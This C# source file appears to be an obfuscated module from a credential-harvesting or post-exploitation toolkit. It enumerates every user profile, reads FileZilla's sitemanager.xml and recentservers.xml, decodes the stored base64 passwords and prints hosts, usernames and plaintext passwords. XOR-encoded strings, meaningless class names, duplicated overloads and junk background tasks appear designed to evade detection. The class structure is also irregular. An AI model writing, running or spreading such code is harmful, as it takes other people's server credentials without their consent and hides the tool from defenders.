using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using O_F41F88FA.Output.TextWriters;
using O_F41F88FA.Output.Formatters;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

namespace O_F41F88FA.Commands
{
    class O_3C59B5D5
    {
        public O_3C59B5D5(string filePath, string name, string host, string port, string protocol, string userName, string password)
        {
            FilePath = filePath;
            Name = name;
            Host = host;
            Port = port;
            Protocol = protocol;
            UserName = userName;
            Password = password;
        }

        public string FilePath { get; set; }
        public string Name { get; set; }
        public string Host { get; set; }
        public string Port { get; set; }
        public string Protocol { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
    }
internal class O_E7897332 : O_2183A68D
{
    public override string Command => Encoding.UTF8.GetString(Convert.FromBase64String("jmwQHVrvHmip").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("yAV8eACGcgQ=")[iii % 8])).ToArray());
    public override string Description => Encoding.UTF8.GetString(Convert.FromBase64String("me/5S6L2M6m+pvZBlvk2oqr09FqR8DHlue/5S4s=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("34aVLvifX8U=")[iii % 8])).ToArray());
    public override CommandGroup[] Group => new[]
    {
        CommandGroup.User,
        CommandGroup.Remote
    };
    public override bool SupportRemote => true;

    public Runtime ThisRunTime;
    public O_E7897332(Runtime runtime) : base(runtime)
    {
        ThisRunTime = runtime;
    }

    public override IEnumerable<O_4AED570F?> Execute(string[] args)
    {
        var dirs = ThisRunTime.GetDirectories(Encoding.UTF8.GetString(Convert.FromBase64String("YEK871rvYQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("PBfPiiicPck=")[iii % 8])).ToArray()));
        foreach (var dir in dirs)
        {
            if (dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("nv7RW1IU").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("zouzNzt3gl8=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("IsImuPgiSA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ZqdA2Y1OPDk=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("CcliGeyEFN0Y32EK").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TawEeJnoYP0=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("9o3LMhTEJFzE").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("t+GnEkG3QS4=")[iii % 8])).ToArray())))
                continue;
            var parts = dir.Split('\\');
            var userName = parts[parts.Length - 1];
            var configs = new List<O_3C59B5D5>();
            string[] paths =
            {
                $"{dir}\\AppData\\Roaming\\FileZilla\\sitemanager.xml",
                $"{dir}\\AppData\\Roaming\\FileZilla\\recentservers.xml"};
            foreach (var path in paths)
            {
                if (!File.Exists(path))
                    continue;
                var xmlDoc = new XmlDocument();
                xmlDoc.Load(path);
                var servers = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("K+dFWEsRGw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("eII3Li5jaPM=")[iii % 8])).ToArray()));
                if (servers.Count == 0)
                    servers = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("W5r8mlNKqqN7ifqNTg==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Cf+f/z0++cY=")[iii % 8])).ToArray()));
                if ((servers.Count == 0) || (servers[0].ChildNodes.Count <= 0))
                    continue;
                foreach (XmlNode server in servers[0].ChildNodes)
                {
                    var name = Encoding.UTF8.GetString(Convert.FromBase64String("NgFPn9MSV6FZFliK0w49").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ClMK3JZcA4E=")[iii % 8])).ToArray());
                    var tempName = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("444xew==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("re9cHoH27XY=")[iii % 8])).ToArray()));
                    if (tempName != null)
                    {
                        name = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("GfKJnQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("V5Pk+JTjjU8=")[iii % 8])).ToArray())).InnerText;
                    }

                    var host = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("qnN7Pw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("4hwIS7ZAnQ8=")[iii % 8])).ToArray())).InnerText;
                    var port = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("vfpz7Q==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("7ZUBmZouVbM=")[iii % 8])).ToArray())).InnerText;
                    var protocol = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("WbtiEnfdnR0=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("CckNZhi+8nE=")[iii % 8])).ToArray())).InnerText;
                    var user = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("wWn5OQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("lBqcSxJs15g=")[iii % 8])).ToArray())).InnerText;
                    var tempPassword = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("GOGJAw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("SID6cFnlmcE=")[iii % 8])).ToArray()));
                    var password = Encoding.UTF8.GetString(Convert.FromBase64String("QoDqrbk6").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("fs6/4fUED6E=")[iii % 8])).ToArray());
                    if (tempPassword != null)
                    {
                        if (tempPassword.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("IMqitBZDv24=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("RaTB23Iq0Qk=")[iii % 8])).ToArray())].Value == Encoding.UTF8.GetString(Convert.FromBase64String("jLfeY6gd").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("7tatBp4pd/A=")[iii % 8])).ToArray()))
                        {
                            password = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tempPassword.InnerText));
                        }
                        else
                        {
                            password = Encoding.UTF8.GetString(Convert.FromBase64String("79koiGXfxYOWzVqFaLrLloDdP5V639/p").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("04l6xzGahtc=")[iii % 8])).ToArray());
                        }
                    }

                    var config = new O_3C59B5D5(path, name, host, port, protocol, user, password);
                    configs.Add(config);
                }
            }

            if (configs.Count > 0)
            {
                yield return new O_2B67EEE8(userName, configs);
            }
        }
    }

internal class O_2B67EEE8 : O_4AED570F
{
    public O_2B67EEE8(string userName, List<O_3C59B5D5> configs)
    {
        UserName = userName;
        Configs = configs;
    }

    public string UserName { get; set; }
    public List<O_3C59B5D5> Configs { get; set; }
}    [CommandOutputType(typeof(O_2B67EEE8))]
    internal class O_2923F3F8 : TextFormatterBase
    {
        public O_2923F3F8(ITextWriter writer) : base(writer)
        {
        }

        public override void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults)
        {
            var dto = (O_2B67EEE8)result;
            WriteLine($"  FileZilla Configs ({dto.UserName}):\n");
            foreach (var config in dto.Configs)
            {
                WriteLine($"    FilePath  : {config.FilePath}");
                WriteLine($"    Name      : {config.Name}");
                WriteLine($"    Host      : {config.Host}");
                WriteLine($"    Port      : {config.Port}");
                WriteLine($"    Protocol  : {config.Protocol}");
                WriteLine($"    Username  : {config.UserName}");
                WriteLine($"    Password  : {config.Password}\n");
            }

            WriteLine();
        }

        public void FormatResult(O_2183A68D? command, O_4AED570F result, bool filterResults, string XETjqIhI)
        {
            try
            {
                Task.Run(() =>
                {
                    try
                    {
                        System.Text.ASCIIEncoding instance = new System.Text.ASCIIEncoding();
                        instance.GetMaxCharCount(95);
                    }
                    catch (Exception)
                    {
                    }
                }).Start();
            }
            catch (Exception)
            {
            }

            var dto = (O_2B67EEE8)result;
            WriteLine($"  FileZilla Configs ({dto.UserName}):\n");
            foreach (var config in dto.Configs)
            {
                WriteLine($"    FilePath  : {config.FilePath}");
                WriteLine($"    Name      : {config.Name}");
                WriteLine($"    Host      : {config.Host}");
                WriteLine($"    Port      : {config.Port}");
                WriteLine($"    Protocol  : {config.Protocol}");
                WriteLine($"    Username  : {config.UserName}");
                WriteLine($"    Password  : {config.Password}\n");
            }

            WriteLine();
        }
    }

    public IEnumerable<O_4AED570F?> Execute(string[] args, string xHELiBRD)
    {
        try
        {
            Task.Run(() =>
            {
                try
                {
                    System.Text.ASCIIEncoding instance = new System.Text.ASCIIEncoding();
                    instance.GetMaxCharCount(95);
                }
                catch (Exception)
                {
                }
            }).Start();
        }
        catch (Exception)
        {
        }

        var dirs = ThisRunTime.GetDirectories(Encoding.UTF8.GetString(Convert.FromBase64String("YEK871rvYQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("PBfPiiicPck=")[iii % 8])).ToArray()));
        foreach (var dir in dirs)
        {
            if (dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("nv7RW1IU").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("zouzNzt3gl8=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("IsImuPgiSA==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ZqdA2Y1OPDk=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("CcliGeyEFN0Y32EK").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("TawEeJnoYP0=")[iii % 8])).ToArray())) || dir.EndsWith(Encoding.UTF8.GetString(Convert.FromBase64String("9o3LMhTEJFzE").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("t+GnEkG3QS4=")[iii % 8])).ToArray())))
                continue;
            var parts = dir.Split('\\');
            var userName = parts[parts.Length - 1];
            var configs = new List<O_3C59B5D5>();
            string[] paths =
            {
                $"{dir}\\AppData\\Roaming\\FileZilla\\sitemanager.xml",
                $"{dir}\\AppData\\Roaming\\FileZilla\\recentservers.xml"};
            foreach (var path in paths)
            {
                if (!File.Exists(path))
                    continue;
                var xmlDoc = new XmlDocument();
                xmlDoc.Load(path);
                var servers = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("K+dFWEsRGw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("eII3Li5jaPM=")[iii % 8])).ToArray()));
                if (servers.Count == 0)
                    servers = xmlDoc.GetElementsByTagName(Encoding.UTF8.GetString(Convert.FromBase64String("W5r8mlNKqqN7ifqNTg==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("Cf+f/z0++cY=")[iii % 8])).ToArray()));
                if ((servers.Count == 0) || (servers[0].ChildNodes.Count <= 0))
                    continue;
                foreach (XmlNode server in servers[0].ChildNodes)
                {
                    var name = Encoding.UTF8.GetString(Convert.FromBase64String("NgFPn9MSV6FZFliK0w49").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("ClMK3JZcA4E=")[iii % 8])).ToArray());
                    var tempName = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("444xew==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("re9cHoH27XY=")[iii % 8])).ToArray()));
                    if (tempName != null)
                    {
                        name = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("GfKJnQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("V5Pk+JTjjU8=")[iii % 8])).ToArray())).InnerText;
                    }

                    var host = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("qnN7Pw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("4hwIS7ZAnQ8=")[iii % 8])).ToArray())).InnerText;
                    var port = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("vfpz7Q==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("7ZUBmZouVbM=")[iii % 8])).ToArray())).InnerText;
                    var protocol = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("WbtiEnfdnR0=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("CckNZhi+8nE=")[iii % 8])).ToArray())).InnerText;
                    var user = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("wWn5OQ==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("lBqcSxJs15g=")[iii % 8])).ToArray())).InnerText;
                    var tempPassword = server.SelectSingleNode(Encoding.UTF8.GetString(Convert.FromBase64String("GOGJAw==").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("SID6cFnlmcE=")[iii % 8])).ToArray()));
                    var password = Encoding.UTF8.GetString(Convert.FromBase64String("QoDqrbk6").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("fs6/4fUED6E=")[iii % 8])).ToArray());
                    if (tempPassword != null)
                    {
                        if (tempPassword.Attributes[Encoding.UTF8.GetString(Convert.FromBase64String("IMqitBZDv24=").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("RaTB23Iq0Qk=")[iii % 8])).ToArray())].Value == Encoding.UTF8.GetString(Convert.FromBase64String("jLfeY6gd").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("7tatBp4pd/A=")[iii % 8])).ToArray()))
                        {
                            password = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(tempPassword.InnerText));
                        }
                        else
                        {
                            password = Encoding.UTF8.GetString(Convert.FromBase64String("79koiGXfxYOWzVqFaLrLloDdP5V639/p").Select((bbb, iii) => (byte)(bbb ^ Convert.FromBase64String("04l6xzGahtc=")[iii % 8])).ToArray());
                        }
                    }

                    var config = new O_3C59B5D5(path, name, host, port, protocol, user, password);
                    configs.Add(config);
                }
            }

            if (configs.Count > 0)
            {
                yield return new O_2B67EEE8(userName, configs);
            }
        }
    }
}}